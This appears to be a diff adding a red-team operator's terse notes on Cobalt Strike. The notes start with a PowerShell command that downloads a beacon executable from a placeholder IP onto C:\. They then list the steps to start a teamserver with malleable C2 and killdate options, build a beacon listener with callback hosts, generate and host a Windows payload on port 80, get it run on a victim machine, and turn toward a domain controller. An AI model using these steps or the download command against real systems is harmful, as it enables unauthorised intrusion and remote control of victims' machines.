@@ -1,0 +1,34 @@
+
+Cobalt Strike:
+Invoke-WebRequest -URL <http:ipaddr>/beacon.exe -Outfile C:\beacon.exe
+
+COBALT STRIKE FROM THE START:
+
+Unzip cobalt strike with tar
+
+Run ./update
+
+Run ./teamserver
+A.            4 options to run. 2 are mandatory: give it an IP (generally it is an external IP because its red team tool. Give it an internal IP for your internal box). Second option is the password, and is required. 3rd option is the malleable c2. 4th is the killdate. 
+Teamserver remains running. Then run cobalt strike itself with ./cobaltstrike
+A.            Enter host port user and password. User can be anything, server is teamserver password.
+B.            Make sure fingerprints match
+
+Set up a listener
+- Name
+- Beacon Payload
+- Add call back hosts
+
+Choose Windows Executable
+                - Feed it your listener
+                -Generate
+
+Host on the webserver on port 80
+- Click the link icon in the toolbar menu
+- Fill out appropriate information
+
+- Navigate to webserver in victim IP machine
+
+- Back to CB, set: sleep 0
+
+\\<DC IP Addr>
